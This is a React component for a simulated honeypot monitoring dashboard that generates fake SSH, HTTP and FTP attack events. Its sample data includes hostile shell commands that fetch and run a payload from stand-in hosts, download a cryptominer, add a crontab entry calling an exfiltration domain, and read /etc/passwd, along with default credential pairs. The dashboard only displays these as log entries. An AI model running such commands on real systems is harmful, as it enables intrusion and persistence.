
import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle, CardFooter } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Database, AlertTriangle, Terminal, Globe, Server, Shield, Clock, Copy, ExternalLink } from 'lucide-react';
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Progress } from "@/components/ui/progress";
import { useToast } from "@/hooks/use-toast";
import { ScrollArea } from "@/components/ui/scroll-area";

// Types for honeypot events
interface HoneypotEvent {
  id: string;
  timestamp: Date;
  ip: string;
  country: string;
  activity: string;
  honeypotType: 'ssh' | 'http' | 'ftp';
  details?: string;
  commands?: string[];
  credentialsUsed?: { username: string; password: string };
  blocked: boolean;
}

const HoneypotsInterface = () => {
  const { toast } = useToast();
  const [activeTab, setActiveTab] = useState('ssh');
  const [sshEvents, setSshEvents] = useState<HoneypotEvent[]>([]);
  const [httpEvents, setHttpEvents] = useState<HoneypotEvent[]>([]);
  const [ftpEvents, setFtpEvents] = useState<HoneypotEvent[]>([]);
  const [sshRunning, setSshRunning] = useState(false);
  const [httpRunning, setHttpRunning] = useState(false);
  const [ftpRunning, setFtpRunning] = useState(false);
  const [sshConnectionCount, setSshConnectionCount] = useState(0);
  const [httpConnectionCount, setHttpConnectionCount] = useState(0);
  const [ftpConnectionCount, setFtpConnectionCount] = useState(0);
  
  // Sample IPs and countries
  const ipLocations = [
    { ip: '45.227.254.56', country: 'Brazil' },
    { ip: '89.248.167.131', country: 'Netherlands' },
    { ip: '118.193.40.127', country: 'China' },
    { ip: '193.106.31.98', country: 'Russia' },
    { ip: '122.186.69.212', country: 'Australia' },
    { ip: '35.158.114.186', country: 'Germany' },
    { ip: '137.74.192.77', country: 'France' },
    { ip: '5.188.206.26', country: 'Ukraine' },
  ];
  
  // Sample credentials
  const credentials = [
    { username: 'root', password: '123456' },
    { username: 'admin', password: 'admin' },
    { username: 'user', password: 'password' },
    { username: 'test', password: 'test' },
    { username: 'oracle', password: 'oracle' },
    { username: 'ubuntu', password: 'ubuntu' },
    { username: 'administrator', password: 'P@ssw0rd' },
    { username: 'postgres', password: 'postgres' },
  ];
  
  // Sample SSH commands
  const sshCommands = [
    ['ls -la', 'cat /etc/passwd', 'uname -a'],
    ['wget http://malicious-domain.com/payload.sh', 'chmod +x payload.sh', './payload.sh'],
    ['cd /tmp', 'curl -O http://malware.com/cryptominer', 'chmod 777 cryptominer'],
    ['ps aux | grep ssh', 'netstat -tulpn', 'who'],
    ['echo "*/5 * * * * curl http://exfil-data.xyz" >> /etc/crontab'],
  ];
  
  // Sample HTTP activites
  const httpActivities = [
    'SQL Injection attempt on login form',
    'Cross-Site Scripting (XSS) attempt in search field',
    'Local File Inclusion (LFI) attempt via path traversal',
    'Remote File Inclusion (RFI) attempt',
    'Command Injection in user agent field',
    'Admin panel brute force attempt',
    'Directory traversal attack',
    'Sensitive file access attempt (.env, wp-config.php)',
  ];
  
  // Sample FTP activities
  const ftpActivities = [
    'Anonymous login attempt',
    'Brute force login attempt',
    'Directory traversal (/../../etc/passwd)',
    'Attempt to upload malicious file',
    'Attempt to download sensitive data',
    'Excessive connection attempts',
    'Command injection via filename',
  ];
  
  // Toggle SSH honeypot
  const toggleSSH = () => {
    if (sshRunning) {
      setSshRunning(false);
      toast({
        title: "SSH Honeypot Stopped",
        description: "SSH honeypot service has been stopped",
        variant: "default"
      });
    } else {
      setSshRunning(true);
      toast({
        title: "SSH Honeypot Started",
        description: "SSH honeypot is now capturing connection attempts",
        variant: "default"
      });
    }
  };
  
  // Toggle HTTP honeypot
  const toggleHTTP = () => {
    if (httpRunning) {
      setHttpRunning(false);
      toast({
        title: "HTTP Admin Panel Honeypot Stopped",
        description: "HTTP honeypot service has been stopped",
        variant: "default"
      });
    } else {
      setHttpRunning(true);
      toast({
        title: "HTTP Admin Panel Honeypot Started",
        description: "HTTP honeypot is now capturing connection attempts",
        variant: "default"
      });
    }
  };
  
  // Toggle FTP honeypot
  const toggleFTP = () => {
    if (ftpRunning) {
      setFtpRunning(false);
      toast({
        title: "FTP Server Honeypot Stopped",
        description: "FTP honeypot service has been stopped",
        variant: "default"
      });
    } else {
      setFtpRunning(true);
      toast({
        title: "FTP Server Honeypot Started",
        description: "FTP honeypot is now capturing connection attempts",
        variant: "default"
      });
    }
  };
  
  // Block an IP
  const blockIP = (ip: string, honeypotType: 'ssh' | 'http' | 'ftp') => {
    switch (honeypotType) {
      case 'ssh':
        setSshEvents(prev => prev.map(event => 
          event.ip === ip ? { ...event, blocked: true } : event
        ));
        break;
      case 'http':
        setHttpEvents(prev => prev.map(event => 
          event.ip === ip ? { ...event, blocked: true } : event
        ));
        break;
      case 'ftp':
        setFtpEvents(prev => prev.map(event => 
          event.ip === ip ? { ...event, blocked: true } : event
        ));
        break;
    }
    
    toast({
      title: "IP Address Blocked",
      description: `${ip} has been blocked from accessing the system`,
      variant: "default"
    });
  };
  
  // Generate a new SSH event
  const generateSSHEvent = (): HoneypotEvent => {
    const ipLocation = ipLocations[Math.floor(Math.random() * ipLocations.length)];
    const credential = credentials[Math.floor(Math.random() * credentials.length)];
    const commandSet = sshCommands[Math.floor(Math.random() * sshCommands.length)];
    
    return {
      id: `ssh-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
      timestamp: new Date(),
      ip: ipLocation.ip,
      country: ipLocation.country,
      activity: 'SSH Login Attempt',
      honeypotType: 'ssh',
      details: `Login attempt with credentials`,
      commands: commandSet,
      credentialsUsed: credential,
      blocked: false
    };
  };
  
  // Generate a new HTTP event
  const generateHTTPEvent = (): HoneypotEvent => {
    const ipLocation = ipLocations[Math.floor(Math.random() * ipLocations.length)];
    const activity = httpActivities[Math.floor(Math.random() * httpActivities.length)];
    
    return {
      id: `http-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
      timestamp: new Date(),
      ip: ipLocation.ip,
      country: ipLocation.country,
      activity,
      honeypotType: 'http',
      details: `HTTP request to /admin with suspicious payload`,
      blocked: false
    };
  };
  
  // Generate a new FTP event
  const generateFTPEvent = (): HoneypotEvent => {
    const ipLocation = ipLocations[Math.floor(Math.random() * ipLocations.length)];
    const activity = ftpActivities[Math.floor(Math.random() * ftpActivities.length)];
    const credential = credentials[Math.floor(Math.random() * credentials.length)];
    
    return {
      id: `ftp-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
      timestamp: new Date(),
      ip: ipLocation.ip,
      country: ipLocation.country,
      activity,
      honeypotType: 'ftp',
      details: `FTP ${activity.toLowerCase()}`,
      credentialsUsed: credential,
      blocked: false
    };
  };
  
  // Simulation effect for SSH honeypot
  useEffect(() => {
    if (!sshRunning) return;
    
    const interval = setInterval(() => {
      // 30% chance of generating a new event
      if (Math.random() < 0.3) {
        const newEvent = generateSSHEvent();
        setSshEvents(prev => [newEvent, ...prev].slice(0, 100));
        setSshConnectionCount(prev => prev + 1);
        
        // Show toast for some events
        if (Math.random() < 0.3) {
          toast({
            title: "SSH Connection Detected",
            description: `Login attempt from ${newEvent.ip} (${newEvent.country})`,
            variant: "default"
          });
        }
      }
    }, 3000);
    
    return () => clearInterval(interval);
  }, [sshRunning, toast]);
  
  // Simulation effect for HTTP honeypot
  useEffect(() => {
    if (!httpRunning) return;
    
    const interval = setInterval(() => {
      // 40% chance of generating a new event
      if (Math.random() < 0.4) {
        const newEvent = generateHTTPEvent();
        setHttpEvents(prev => [newEvent, ...prev].slice(0, 100));
        setHttpConnectionCount(prev => prev + 1);
        
        // Show toast for certain types of attacks
        if (newEvent.activity.includes('SQL Injection') || newEvent.activity.includes('Command Injection')) {
          toast({
            title: "Attack Detected",
            description: `${newEvent.activity} from ${newEvent.ip}`,
            variant: "destructive"
          });
        }
      }
    }, 4000);
    
    return () => clearInterval(interval);
  }, [httpRunning, toast]);
  
  // Simulation effect for FTP honeypot
  useEffect(() => {
    if (!ftpRunning) return;
    
    const interval = setInterval(() => {
      // 25% chance of generating a new event
      if (Math.random() < 0.25) {
        const newEvent = generateFTPEvent();
        setFtpEvents(prev => [newEvent, ...prev].slice(0, 100));
        setFtpConnectionCount(prev => prev + 1);
        
        // Show toast for upload attempts
        if (newEvent.activity.includes('upload')) {
          toast({
            title: "FTP Alert",
            description: `Malicious file upload attempt from ${newEvent.ip}`,
            variant: "destructive"
          });
        }
      }
    }, 5000);
    
    return () => clearInterval(interval);
  }, [ftpRunning, toast]);
  
  return (
    <Card className="overflow-hidden shadow-lg border-isimbi-purple/20">
      <CardHeader>
        <CardTitle className="flex items-center gap-2">
          <Database className="h-5 w-5 text-isimbi-purple" />
          Honeypot System
        </CardTitle>
        <CardDescription>Monitor decoy systems to detect and analyze attack patterns</CardDescription>
      </CardHeader>
      
      <CardContent className="p-6">
        <Tabs defaultValue="ssh" onValueChange={setActiveTab}>
          <TabsList className="mb-6">
            <TabsTrigger value="ssh">SSH Honeypot</TabsTrigger>
            <TabsTrigger value="http">HTTP Admin Panel</TabsTrigger>
            <TabsTrigger value="ftp">FTP Server</TabsTrigger>
          </TabsList>
          
          <TabsContent value="ssh" className="pt-2">
            <div className="space-y-6">
              <div className="flex items-center justify-between">
                <div className="space-y-1">
                  <h3 className="font-medium">SSH Honeypot</h3>
                  <p className="text-sm text-muted-foreground">
                    Emulates SSH server to capture login attempts and record executed commands
                  </p>
                </div>
                
                <div className="flex items-center gap-2">
                  <Badge variant={sshRunning ? "default" : "secondary"}>
                    {sshRunning ? "Running" : "Stopped"}
                  </Badge>
                  <Button 
                    variant={sshRunning ? "destructive" : "default"}
                    onClick={toggleSSH}
                  >
                    {sshRunning ? "Stop Honeypot" : "Start Honeypot"}
                  </Button>
                </div>
              </div>
              
              {sshRunning ? (
                <>
                  <div className="grid grid-cols-3 gap-4">
                    <div className="border rounded-md p-3">
                      <div className="text-sm text-muted-foreground">Connection Attempts</div>
                      <div className="text-2xl font-bold">{sshConnectionCount}</div>
                    </div>
                    <div className="border rounded-md p-3">
                      <div className="text-sm text-muted-foreground">Unique IPs</div>
                      <div className="text-2xl font-bold">
                        {new Set(sshEvents.map(e => e.ip)).size}
                      </div>
                    </div>
                    <div className="border rounded-md p-3">
                      <div className="text-sm text-muted-foreground">Blocked IPs</div>
                      <div className="text-2xl font-bold">
                        {sshEvents.filter(e => e.blocked).length}
                      </div>
                    </div>
                  </div>
                  
                  <div className="border rounded-md overflow-hidden">
                    <div className="bg-muted px-3 py-2 font-medium text-sm">
                      Connection Log
                    </div>
                    
                    <ScrollArea className="h-[300px]">
                      {sshEvents.length > 0 ? (
                        <div className="divide-y">
                          {sshEvents.map((event) => (
                            <div key={event.id} className="p-3 hover:bg-muted/50">
                              <div className="flex items-center justify-between">
                                <div className="font-medium">
                                  {event.ip} ({event.country})
                                </div>
                                <div className="flex items-center gap-2">
                                  <Badge variant="outline" className="text-xs">
                                    {event.timestamp.toLocaleTimeString()}
                                  </Badge>
                                  {event.blocked && (
                                    <Badge variant="destructive" className="text-xs">
                                      Blocked
                                    </Badge>
                                  )}
                                </div>
                              </div>
                              
                              <div className="text-sm text-muted-foreground mt-1">
                                Login attempt: {event.credentialsUsed?.username}:{event.credentialsUsed?.password}
                              </div>
                              
                              {event.commands && event.commands.length > 0 && (
                                <div className="mt-2 font-mono text-xs bg-background border rounded p-2 flex flex-col gap-1">
                                  {event.commands.map((cmd, i) => (
                                    <div key={i} className="flex gap-2">
                                      <span className="text-blue-500">$</span>
                                      <span>{cmd}</span>
                                    </div>
                                  ))}
                                </div>
                              )}
                              
                              {!event.blocked && (
                                <div className="mt-2">
                                  <Button 
                                    size="sm" 
                                    variant="destructive" 
                                    onClick={() => blockIP(event.ip, 'ssh')}
                                    className="h-7 text-xs"
                                  >
                                    Block IP
                                  </Button>
                                </div>
                              )}
                            </div>
                          ))}
                        </div>
                      ) : (
                        <div className="flex items-center justify-center h-full">
                          <div className="text-center p-8">
                            <Terminal className="mx-auto h-8 w-8 text-muted-foreground mb-2" />
                            <p className="text-sm text-muted-foreground">
                              No connection attempts recorded yet
                            </p>
                          </div>
                        </div>
                      )}
                    </ScrollArea>
                  </div>
                </>
              ) : (
                <div className="flex flex-col items-center justify-center py-8 text-center space-y-4">
                  <Terminal className="h-16 w-16 text-muted-foreground/50" />
                  <div>
                    <h3 className="text-lg font-semibold mb-2">SSH Honeypot Not Active</h3>
                    <p className="text-sm text-muted-foreground mb-4">
                      Start the SSH honeypot to begin capturing login attempts and commands
                    </p>
                    <Button onClick={toggleSSH}>Start SSH Honeypot</Button>
                  </div>
                </div>
              )}
            </div>
          </TabsContent>
          
          <TabsContent value="http" className="pt-2">
            <div className="space-y-6">
              <div className="flex items-center justify-between">
                <div className="space-y-1">
                  <h3 className="font-medium">HTTP Admin Panel Honeypot</h3>
                  <p className="text-sm text-muted-foreground">
                    Simulates vulnerable admin interface to capture web attack attempts
                  </p>
                </div>
                
                <div className="flex items-center gap-2">
                  <Badge variant={httpRunning ? "default" : "secondary"}>
                    {httpRunning ? "Running" : "Stopped"}
                  </Badge>
                  <Button 
                    variant={httpRunning ? "destructive" : "default"}
                    onClick={toggleHTTP}
                  >
                    {httpRunning ? "Stop Honeypot" : "Start Honeypot"}
                  </Button>
                </div>
              </div>
              
              {httpRunning ? (
                <>
                  <div className="grid grid-cols-3 gap-4">
                    <div className="border rounded-md p-3">
                      <div className="text-sm text-muted-foreground">Connection Attempts</div>
                      <div className="text-2xl font-bold">{httpConnectionCount}</div>
                    </div>
                    <div className="border rounded-md p-3">
                      <div className="text-sm text-muted-foreground">Attack Types</div>
                      <div className="text-2xl font-bold">
                        {new Set(httpEvents.map(e => e.activity)).size}
                      </div>
                    </div>
                    <div className="border rounded-md p-3">
                      <div className="text-sm text-muted-foreground">Blocked IPs</div>
                      <div className="text-2xl font-bold">
                        {httpEvents.filter(e => e.blocked).length}
                      </div>
                    </div>
                  </div>
                  
                  <div className="border rounded-md overflow-hidden">
                    <div className="bg-muted px-3 py-2 font-medium text-sm">
                      HTTP Attack Log
                    </div>
                    
                    <ScrollArea className="h-[300px]">
                      {httpEvents.length > 0 ? (
                        <div className="divide-y">
                          {httpEvents.map((event) => (
                            <div key={event.id} className="p-3 hover:bg-muted/50">
                              <div className="flex items-center justify-between">
                                <div className="font-medium">
                                  {event.ip} ({event.country})
                                </div>
                                <div className="flex items-center gap-2">
                                  <Badge variant="outline" className="text-xs">
                                    {event.timestamp.toLocaleTimeString()}
                                  </Badge>
                                  {event.blocked && (
                                    <Badge variant="destructive" className="text-xs">
                                      Blocked
                                    </Badge>
                                  )}
                                </div>
                              </div>
                              
                              <div className="mt-1 mb-2">
                                <Badge variant="outline" className={`
                                  ${event.activity.includes('SQL') ? 'bg-red-500/10 text-red-500 border-red-500' :
                                    event.activity.includes('XSS') ? 'bg-amber-500/10 text-amber-500 border-amber-500' :
                                    'bg-blue-500/10 text-blue-500 border-blue-500'}
                                `}>
                                  {event.activity}
                                </Badge>
                              </div>
                              
                              <div className="text-sm text-muted-foreground">
                                {event.details}
                              </div>
                              
                              {!event.blocked && (
                                <div className="mt-2">
                                  <Button 
                                    size="sm" 
                                    variant="destructive" 
                                    onClick={() => blockIP(event.ip, 'http')}
                                    className="h-7 text-xs"
                                  >
                                    Block IP
                                  </Button>
                                </div>
                              )}
                            </div>
                          ))}
                        </div>
                      ) : (
                        <div className="flex items-center justify-center h-full">
                          <div className="text-center p-8">
                            <Globe className="mx-auto h-8 w-8 text-muted-foreground mb-2" />
                            <p className="text-sm text-muted-foreground">
                              No attack attempts recorded yet
                            </p>
                          </div>
                        </div>
                      )}
                    </ScrollArea>
                  </div>
                </>
              ) : (
                <div className="flex flex-col items-center justify-center py-8 text-center space-y-4">
                  <Globe className="h-16 w-16 text-muted-foreground/50" />
                  <div>
                    <h3 className="text-lg font-semibold mb-2">HTTP Honeypot Not Active</h3>
                    <p className="text-sm text-muted-foreground mb-4">
                      Start the HTTP honeypot to begin capturing web attack patterns
                    </p>
                    <Button onClick={toggleHTTP}>Start HTTP Honeypot</Button>
                  </div>
                </div>
              )}
            </div>
          </TabsContent>
          
          <TabsContent value="ftp" className="pt-2">
            <div className="space-y-6">
              <div className="flex items-center justify-between">
                <div className="space-y-1">
                  <h3 className="font-medium">FTP Server Honeypot</h3>
                  <p className="text-sm text-muted-foreground">
                    Simulates FTP server to capture login attempts and file transfer activities
                  </p>
                </div>
                
                <div className="flex items-center gap-2">
                  <Badge variant={ftpRunning ? "default" : "secondary"}>
                    {ftpRunning ? "Running" : "Stopped"}
                  </Badge>
                  <Button 
                    variant={ftpRunning ? "destructive" : "default"}
                    onClick={toggleFTP}
                  >
                    {ftpRunning ? "Stop Honeypot" : "Start Honeypot"}
                  </Button>
                </div>
              </div>
              
              {ftpRunning ? (
                <>
                  <div className="grid grid-cols-3 gap-4">
                    <div className="border rounded-md p-3">
                      <div className="text-sm text-muted-foreground">Connection Attempts</div>
                      <div className="text-2xl font-bold">{ftpConnectionCount}</div>
                    </div>
                    <div className="border rounded-md p-3">
                      <div className="text-sm text-muted-foreground">Unique Countries</div>
                      <div className="text-2xl font-bold">
                        {new Set(ftpEvents.map(e => e.country)).size}
                      </div>
                    </div>
                    <div className="border rounded-md p-3">
                      <div className="text-sm text-muted-foreground">Blocked IPs</div>
                      <div className="text-2xl font-bold">
                        {ftpEvents.filter(e => e.blocked).length}
                      </div>
                    </div>
                  </div>
                  
                  <div className="border rounded-md overflow-hidden">
                    <div className="bg-muted px-3 py-2 font-medium text-sm">
                      FTP Connection Log
                    </div>
                    
                    <ScrollArea className="h-[300px]">
                      {ftpEvents.length > 0 ? (
                        <div className="divide-y">
                          {ftpEvents.map((event) => (
                            <div key={event.id} className="p-3 hover:bg-muted/50">
                              <div className="flex items-center justify-between">
                                <div className="font-medium">
                                  {event.ip} ({event.country})
                                </div>
                                <div className="flex items-center gap-2">
                                  <Badge variant="outline" className="text-xs">
                                    {event.timestamp.toLocaleTimeString()}
                                  </Badge>
                                  {event.blocked && (
                                    <Badge variant="destructive" className="text-xs">
                                      Blocked
                                    </Badge>
                                  )}
                                </div>
                              </div>
                              
                              <div className="text-sm mt-1 mb-1">
                                <span className="font-medium">{event.activity}</span>
                              </div>
                              
                              {event.credentialsUsed && (
                                <div className="text-sm text-muted-foreground mb-1">
                                  Credentials: {event.credentialsUsed?.username}:{event.credentialsUsed?.password}
                                </div>
                              )}
                              
                              {!event.blocked && (
                                <div className="mt-2">
                                  <Button 
                                    size="sm" 
                                    variant="destructive" 
                                    onClick={() => blockIP(event.ip, 'ftp')}
                                    className="h-7 text-xs"
                                  >
                                    Block IP
                                  </Button>
                                </div>
                              )}
                            </div>
                          ))}
                        </div>
                      ) : (
                        <div className="flex items-center justify-center h-full">
                          <div className="text-center p-8">
                            <Server className="mx-auto h-8 w-8 text-muted-foreground mb-2" />
                            <p className="text-sm text-muted-foreground">
                              No FTP connection attempts recorded yet
                            </p>
                          </div>
                        </div>
                      )}
                    </ScrollArea>
                  </div>
                </>
              ) : (
                <div className="flex flex-col items-center justify-center py-8 text-center space-y-4">
                  <Server className="h-16 w-16 text-muted-foreground/50" />
                  <div>
                    <h3 className="text-lg font-semibold mb-2">FTP Honeypot Not Active</h3>
                    <p className="text-sm text-muted-foreground mb-4">
                      Start the FTP honeypot to begin capturing connection attempts
                    </p>
                    <Button onClick={toggleFTP}>Start FTP Honeypot</Button>
                  </div>
                </div>
              )}
            </div>
          </TabsContent>
        </Tabs>
      </CardContent>
      
      <CardFooter className="bg-card/50 border-t border-border/50 flex justify-between">
        <div className="text-xs text-muted-foreground flex items-center">
          <Clock className="h-3.5 w-3.5 mr-1" />
          {activeTab === 'ssh' ? (
            sshRunning ? `Running since ${new Date().toLocaleTimeString()}` : 'Honeypot inactive'
          ) : activeTab === 'http' ? (
            httpRunning ? `Running since ${new Date().toLocaleTimeString()}` : 'Honeypot inactive'
          ) : (
            ftpRunning ? `Running since ${new Date().toLocaleTimeString()}` : 'Honeypot inactive'
          )}
        </div>
        
        <div className="flex gap-2">
          <Button variant="outline" size="sm" className="text-xs flex items-center gap-1">
            <Copy size={12} />
            Export Logs
          </Button>
          <Button variant="outline" size="sm" className="text-xs flex items-center gap-1">
            <ExternalLink size={12} />
            View Analysis
          </Button>
        </div>
      </CardFooter>
    </Card>
  );
};

export default HoneypotsInterface;
